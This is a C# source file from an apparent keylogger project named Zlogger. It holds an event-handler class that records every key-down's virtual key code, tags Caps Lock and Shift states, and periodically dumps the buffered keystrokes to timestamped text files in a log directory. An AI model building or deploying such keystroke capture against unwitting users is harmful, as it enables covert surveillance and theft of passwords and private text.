using Rodjenihm.Zlogger.Core;
using System;
using System.IO;

namespace Rodjenihm.Zlogger
{
    public static class KeyloggerEventHandler
    {
        public static void HandleKeyDown(Keylogger keylogger, Core.KeyEventArgs e)
        {
            var key = e.VkCode;
            if (key == 20)
            {
                if (!e.IsCapsLocked)
                {
                    keylogger.Buffer.Append($"{key},");
                }
                else
                {
                    keylogger.Buffer.Append($"/{key},");
                }
                return;
            }

            keylogger.Buffer.Append($"{key},");
        }

        public static void HandleKeyUp(Keylogger keylogger, Core.KeyEventArgs e)
        {
            var key = e.VkCode;
            if (key == 160 || key == 161)
            {
                keylogger.Buffer.Append($"/{key},");
            }
        }

        public static void HandleIntervalElapsed(Keylogger keylogger)
        {
            if (keylogger.Buffer.Length > 0)
            {
                var logName = $"log_{DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss")}.txt";
                var logPath = Path.Combine(keylogger.LogDir, logName);
                File.WriteAllText(logPath, keylogger.Buffer.ToString());

                keylogger.Buffer.Clear();
            }
        }
    }
}
